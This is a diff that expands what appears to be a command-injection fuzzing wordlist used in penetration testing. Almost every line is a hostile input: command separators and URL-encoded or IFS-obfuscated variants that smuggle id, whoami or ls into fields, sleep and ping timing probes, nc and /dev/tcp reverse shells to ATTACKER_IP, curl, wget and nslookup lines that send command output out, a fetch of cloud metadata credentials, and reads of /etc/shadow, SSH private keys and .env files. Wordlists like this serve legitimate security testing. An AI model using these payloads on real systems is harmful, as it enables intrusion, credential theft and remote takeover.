@@ -1,23 +1,100 @@
 ; id
 | id
-|| id
 & id
 && id
+|| id
 `id`
 $(id)
+; ls
+| ls
+& ls
+`ls`
+$(ls)
 ; cat /etc/passwd
 | cat /etc/passwd
-; ls -la
 ; whoami
+| whoami
 ; uname -a
-$(cat /etc/passwd)
+; hostname
+; pwd
+; env
+; ps aux
+; ifconfig
+; ip addr
+; netstat -an
+; id; ls
+; id | tee /tmp/x
+; id; cat /etc/passwd
+; id; whoami
 `cat /etc/passwd`
-; curl http://attacker.com/$(id)
-; ping -c 1 attacker.com
-1; id
-1 | id
-1 && id
-1 || id
-%3B id
-%7C id
-%26 id
+$(cat /etc/passwd)
+; id #
+& id #
+| id #
+; id; echo
+; id; true
+; id; false
+;id
+|id
+&id
+&&id
+||id
+;id;
+|id|
+&id&
+&&id&&
+||id||
+%3bid
+%7cid
+%26id
+%3b%20id
+%7c%20id
+%26%26%20id
+%60id%60
+%24%28id%29
+;${IFS}id
+|${IFS}id
+;a=id;$a
+;a=i;b=d;$a$b
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+; nc ATTACKER_IP 4444 -e /bin/bash
+; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+; python3 -c 'import socket,subprocess,os;...'
+; curl http://ATTACKER_IP/?c=$(id|base64)
+; wget http://ATTACKER_IP/?c=$(id|base64)
+; nslookup $(id).ATTACKER_URL
+; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+; find / -perm -u=s -type f 2>/dev/null
+; cat ~/.ssh/id_rsa
+; cat /var/www/html/.env
+; cat /var/www/html/config.php
+; cat /etc/shadow
+; cat /etc/crontab
+; crontab -l
+; last
+; who
+; w
+& whoami
+& hostname
+& ver
+& dir C:\
+& type C:\Windows\win.ini
+& ipconfig
+& net user
+| dir
+| whoami
+| hostname
+`whoami`
+$(whoami)
+%0a id
+%0d id
+%0a%0d id
+
+ id
+
+ id
